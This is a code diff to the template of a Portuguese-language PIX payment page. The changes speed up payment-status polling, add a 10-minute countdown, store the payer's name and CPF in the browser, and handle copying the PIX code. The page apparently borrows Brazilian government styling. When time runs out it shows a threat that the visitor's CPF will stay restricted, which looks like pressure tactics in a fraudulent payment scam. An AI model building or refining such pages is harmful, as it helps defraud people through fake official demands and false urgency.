@@ -14,7 +14,7 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* All existing styles remain unchanged */
+        /* Copy all styles from payment.html but change the title */
         @font-face {
             font-family: 'Rawline';
             src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
@@ -279,46 +279,88 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            function checkStatus() {
-                fetch('/check-payment-status/{{ transaction_id }}')
-                .then(response => response.text())
-                .then(text => {
-                    console.log("[DEBUG] Resposta:", text);
-                    if (text.includes('"status":"APPROVED"')) {
-                        window.location.href = '/obrigado';
-                    }
-                });
-            }
+            let transactionId = '{{ transaction_id }}';
+            let checkInterval;
+            let hasRedirected = false;
 
-            // Verifica a cada 1 segundo
-            setInterval(checkStatus, 1000);
-
-            // Timer de 10 minutos
-            let timeLeft = 600;
-            setInterval(() => {
-                document.getElementById('timer').textContent = 
-                    `${Math.floor(timeLeft/60).toString().padStart(2,'0')}:${(timeLeft%60).toString().padStart(2,'0')}`;
-                if (timeLeft-- <= 0) window.location.href = '/';
+            // Timer functionality
+            let timeLeft = 10 * 60;
+            const timerDisplay = document.getElementById('timer');
+            const countdown = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    clearInterval(checkInterval);
+                    timerDisplay.textContent = "00:00";
+                    alert("Tempo expirado! Seu CPF permanecerá com restrições.");
+                    window.location.href = '/';
+                }
+                timeLeft--;
             }, 1000);
 
-            // Mostra conteúdo após 1.5s
+            function doRedirect() {
+                if (hasRedirected) return;
+                hasRedirected = true;
+
+                // Executa o redirecionamento instantaneamente
+                window.location.href = '/obrigado';
+
+                // Operações secundárias que não devem atrasar o redirecionamento
+                try {
+                    localStorage.setItem('userData', JSON.stringify({
+                        nome: '{{ nome }}',
+                        cpf: '{{ cpf }}'
+                    }));
+                    clearInterval(checkInterval);
+                    clearInterval(countdown);
+                } catch (e) {
+                    console.error('Erro nas operações pós-redirecionamento:', e);
+                }
+            }
+
+            function checkPaymentStatus() {
+                if (hasRedirected) return;
+                fetch(`/check-payment-status/${transactionId}`, {
+                    cache: 'no-store'  // Evita cache da resposta
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'APPROVED') doRedirect();
+                })
+                .catch(console.error);
+            }
+
+            // Verifica a cada 300ms para resposta mais rápida
+            checkInterval = setInterval(checkPaymentStatus, 300);
+            checkPaymentStatus(); // Verificação inicial
+
+            // Mostra o conteúdo após carregar
             setTimeout(() => {
                 document.getElementById('loadingScreen').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'block';
             }, 1500);
 
-            // Função para copiar código PIX
+            // Copiar código PIX
             window.copyPixCode = function() {
-                let button = document.querySelector('.copy-button');
-                navigator.clipboard.writeText(document.getElementById('pixCode').textContent.trim())
-                    .then(() => {
-                        button.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
-                        button.style.backgroundColor = '#28a745';
+                const pixCode = document.getElementById('pixCode').textContent.trim();
+                const copyButton = document.querySelector('.copy-button');
+                navigator.clipboard.writeText(pixCode).then(
+                    function() {
+                        copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+                        copyButton.style.backgroundColor = '#28a745';
                         setTimeout(() => {
-                            button.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
-                            button.style.backgroundColor = '#0c326f';
+                            copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
+                            copyButton.style.backgroundColor = '#0c326f';
                         }, 2000);
-                    });
+                    },
+                    function(err) {
+                        console.error('Erro ao copiar:', err);
+                        copyButton.innerHTML = '<i class="fas fa-times"></i> Erro ao copiar';
+                        copyButton.style.backgroundColor = '#dc3545';
+                    }
+                );
             }
         });
     </script>
